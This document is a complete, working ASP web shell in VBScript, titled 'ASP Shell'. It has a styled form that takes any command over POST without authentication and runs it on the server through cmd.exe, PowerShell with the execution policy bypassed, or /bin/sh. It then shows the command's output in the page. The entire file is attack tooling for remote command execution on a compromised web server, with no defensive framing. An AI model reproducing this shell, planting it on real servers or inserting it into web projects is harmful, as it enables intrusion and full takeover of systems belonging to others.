<%@ Language="VBScript" CodePage=65001 %>
<% Response.CodePage = 65001 %>
<% Response.CharSet = "UTF-8" %>
<% Dim cmd, platform, output, osName, wshShell, isWindows, exec, fullCmd, errOutput %>
<% cmd = Request.Form("cmd") %>
<% platform = Request.Form("platform") %>
<% output = "" %>
<% Set wshShell = Server.CreateObject("WScript.Shell") %>
<% osName = LCase(wshShell.ExpandEnvironmentStrings("%OS%")) %>
<% isWindows = (InStr(osName, "windows") > 0) %>
<% If platform = "" And isWindows Then platform = "windows-cmd" %>
<% If platform = "" And Not isWindows Then platform = "linux-sh" %>
<% If cmd <> "" Then %>
<% On Error Resume Next %>
<% If platform = "windows-cmd" Then %>
<% fullCmd = "cmd.exe /c " & cmd %>
<% ElseIf platform = "windows-ps" Then %>
<% fullCmd = "cmd.exe /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command " & Chr(34) & cmd & Chr(34) %>
<% ElseIf platform = "linux-sh" Then %>
<% fullCmd = "/bin/sh -c " & cmd %>
<% Else %>
<% fullCmd = "cmd.exe /c " & cmd %>
<% End If %>
<% Set exec = wshShell.Exec(fullCmd) %>
<% If Err.Number = 0 Then %>
<% output = exec.StdOut.ReadAll %>
<% errOutput = exec.StdErr.ReadAll %>
<% If errOutput <> "" Then output = output & errOutput %>
<% If Trim(output) = "" Then output = "Command executed successfully. (Exit Code: " & exec.ExitCode & ")" %>
<% Else %>
<% output = "Error: " & Err.Description %>
<% Err.Clear %>
<% End If %>
<% On Error GoTo 0 %>
<% End If %>
<% Set wshShell = Nothing %>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>ASP Shell</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f5f5f5;color:#333;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;padding:20px}
.container{max-width:900px;margin:0 auto}
h1{text-align:center;margin-bottom:24px;color:#222;font-weight:600}
.panel{background:#fff;border:1px solid #ddd;border-radius:8px;padding:24px;margin-bottom:20px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
.panel h2{color:#444;margin-bottom:16px;border-bottom:1px solid #eee;padding-bottom:8px;font-size:16px;font-weight:600}
.form-group{margin-bottom:16px}
label{display:block;margin-bottom:6px;color:#555;font-size:13px;font-weight:500}
input[type="text"],select,textarea{width:100%;padding:10px 12px;background:#fff;border:1px solid #ccc;color:#333;border-radius:6px;font-family:Consolas,'Courier New',monospace;font-size:14px}
textarea{resize:vertical;min-height:80px;max-height:300px;line-height:1.5}
input[type="text"]:focus,select:focus,textarea:focus{outline:none;border-color:#4a90d9;box-shadow:0 0 0 3px rgba(74,144,217,.15)}
button{background:#4a90d9;color:#fff;border:none;padding:10px 20px;border-radius:6px;cursor:pointer;font-family:inherit;font-size:14px;font-weight:500;margin-right:8px;transition:background .2s}
button:hover{background:#357abd}
button[type="button"]{background:#fff;color:#555;border:1px solid #ccc}
button[type="button"]:hover{background:#f0f0f0}
.output{background:#1e1e1e;color:#d4d4d4;border:1px solid #ddd;padding:16px;border-radius:6px;white-space:pre-wrap;font-family:Consolas,'Courier New',monospace;font-size:13px;max-height:400px;overflow-y:auto;margin-top:16px}
.platform-selector{display:flex;gap:8px;margin-bottom:12px}
.platform-btn{padding:7px 14px;background:#fff;border:1px solid #ccc;color:#555;cursor:pointer;border-radius:6px;font-size:13px;transition:all .2s}
.platform-btn:hover{border-color:#4a90d9;color:#4a90d9}
.platform-btn.active{background:#4a90d9;color:#fff;border-color:#4a90d9}
</style>
</head>
<body>
<div class="container">
<h1>ASP Shell</h1>
<div class="panel">
<h2>Command Execution</h2>
<form method="POST" action="cmd.asp">
<div class="form-group">
<label>Platform Selection:</label>
<div class="platform-selector">
<% If isWindows Then %>
<div class="platform-btn <% If platform = "windows-cmd" Then Response.Write "active" %>" onclick="selectPlatform('windows-cmd')">Windows CMD</div>
<div class="platform-btn <% If platform = "windows-ps" Then Response.Write "active" %>" onclick="selectPlatform('windows-ps')">Windows PowerShell</div>
<% Else %>
<div class="platform-btn <% If platform = "linux-sh" Then Response.Write "active" %>" onclick="selectPlatform('linux-sh')">Linux SH</div>
<% End If %>
</div>
<input type="hidden" name="platform" id="platform" value="<%=platform%>">
</div>
<div class="form-group">
<label for="cmd">Command:</label>
<textarea name="cmd" id="cmd" rows="4" placeholder="Enter command to execute..." autocomplete="off"><% If cmd <> "" Then Response.Write Server.HTMLEncode(cmd) %></textarea>
</div>
<button type="submit">Execute</button>
<button type="button" onclick="clearOutput()">Clear</button>
</form>
<div class="output" id="output"><% If output <> "" Then Response.Write Server.HTMLEncode(output) %></div>
</div>
</div>
<script>
function selectPlatform(p){document.getElementById('platform').value=p;var b=document.getElementsByClassName('platform-btn');for(var i=0;i<b.length;i++)b[i].className=b[i].className.replace(' active','');event.target.className+=' active';}
function clearOutput(){document.getElementById('output').innerHTML='';}
document.getElementById('cmd').onkeydown=function(e){if(e.keyCode===13&&!e.shiftKey){e.preventDefault();this.form.submit();}};
window.onload=function(){var t=document.getElementById('cmd');t.focus();t.setSelectionRange(t.value.length,t.value.length);};
</script>
</body>
</html>